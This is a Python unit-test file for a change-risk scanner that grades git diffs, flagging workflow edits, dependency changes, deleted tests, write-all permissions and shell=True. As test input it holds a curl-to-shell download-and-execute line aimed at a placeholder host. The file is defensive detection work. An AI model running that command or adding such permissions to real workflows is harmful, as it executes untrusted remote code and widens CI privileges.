import tempfile
import unittest
from pathlib import Path

from change_risk import analyze, format_report, load_inputs, parse_name_status


class ChangeRiskTest(unittest.TestCase):
    def test_document_only_change_is_low_risk(self):
        result = analyze(b"M\0docs/guide.md\0", "+plain documentation\n-old documentation\n")
        self.assertEqual(result.level, "low")
        self.assertEqual(result.score, 0)

    def test_workflow_change_is_visible(self):
        result = analyze(
            b"M\0.github/workflows/test.yml\0",
            "+permissions:\n+  contents: read\n",
        )
        self.assertEqual(result.level, "medium")
        self.assertIn("workflow-change", {item.category for item in result.findings})

    def test_same_risk_category_is_charged_once_across_files(self):
        names = (
            b"M\0.github/workflows/a.yml\0"
            b"M\0.github/workflows/b.yml\0"
            b"M\0.github/workflows/c.yml\0"
        )
        result = analyze(names, "+contents: read\n")
        workflow_findings = [item for item in result.findings if item.category == "workflow-change"]
        self.assertEqual(len(workflow_findings), 1)
        self.assertEqual(result.score, 30)
        self.assertEqual(result.level, "medium")

    def test_dependency_change_adds_risk(self):
        result = analyze(b"M\0package-lock.json\0", "+updated lock entry\n")
        self.assertEqual(result.score, 20)
        self.assertEqual(result.level, "medium")

    def test_dangerous_added_content_can_be_critical(self):
        risky_one = "permissions:" + " write-all"
        risky_two = "curl https://example.invalid/tool " + "| sh"
        patch = "+" + risky_one + "\n+" + risky_two + "\n"

        result = analyze(b"M\0.github/workflows/deploy.yml\0", patch)
        self.assertEqual(result.level, "critical")
        categories = {item.category for item in result.findings}
        self.assertIn("write-permission-added", categories)
        self.assertIn("download-and-execute-added", categories)

    def test_code_describing_pipe_command_is_not_treated_as_execution(self):
        source_line = '+example = "curl https://example.invalid/tool " + "| sh"\n'
        result = analyze(b"M\0example.py\0", source_line)
        self.assertNotIn(
            "download-and-execute-added",
            {item.category for item in result.findings},
        )

    def test_deleted_test_is_high_risk_signal(self):
        result = analyze(b"D\0tests/test_auth.py\0", "-assert secure\n")
        categories = {item.category for item in result.findings}
        self.assertIn("test-deletion", categories)
        self.assertIn("security-sensitive-path", categories)
        self.assertEqual(result.level, "medium")

    def test_rename_uses_destination_path(self):
        changes = parse_name_status(b"R100\0old.txt\0new.txt\0")
        self.assertEqual(len(changes), 1)
        self.assertEqual(changes[0].status, "R")
        self.assertEqual(changes[0].previous_path, "old.txt")
        self.assertEqual(changes[0].path, "new.txt")

    def test_malformed_name_status_fails_closed(self):
        with self.assertRaises(ValueError):
            parse_name_status(b"M\0\0")
        with self.assertRaises(ValueError):
            parse_name_status(b"Q\0file.txt\0")

    def test_input_size_limit_fails_closed(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            names = root / "names"
            patch = root / "patch"
            names.write_bytes(b"M\0file.txt\0")
            patch.write_bytes(b"123456")

            with self.assertRaises(ValueError):
                load_inputs(names, patch, max_names_bytes=100, max_patch_bytes=5)

    def test_report_never_echoes_added_source_content(self):
        marker = "private-looking-value-that-must-not-be-echoed"
        result = analyze(b"M\0app.py\0", "+print('" + marker + "')\n")
        output = format_report(result)
        self.assertNotIn(marker, output)

    def test_path_is_escaped_for_ci_output(self):
        path = "docs/<tag>|name`with\\nnewline.md"
        result = analyze(b"M\0" + path.encode() + b"\0", "+text\n")
        output = format_report(result)
        self.assertNotIn("<tag>", output)
        self.assertNotIn("|name", output)

    def test_repeated_content_signal_is_charged_once(self):
        dangerous = "shell" + "=True"
        patch = "+" + dangerous + "\n+" + dangerous + "\n"
        result = analyze(b"M\0runner.py\0", patch)
        matches = [item for item in result.findings if item.category == "shell-true-added"]
        self.assertEqual(len(matches), 1)
        self.assertEqual(result.score, 45)


if __name__ == "__main__":
    unittest.main()
